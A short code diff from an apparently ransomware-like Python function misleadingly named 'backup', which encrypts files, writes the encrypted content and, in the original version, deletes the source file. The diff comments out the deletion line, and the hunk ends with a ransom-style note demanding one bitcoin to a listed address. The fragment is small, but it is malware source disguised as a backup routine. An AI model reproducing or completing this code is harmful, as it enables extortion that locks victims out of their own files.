@@ -103,7 +103,7 @@ def backup(folder_name):
             f.write(encrypted_content)
         
 
-        os.remove(file_path)
+        #os.remove(file_path)
     
     note = """1btc to：1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
 """
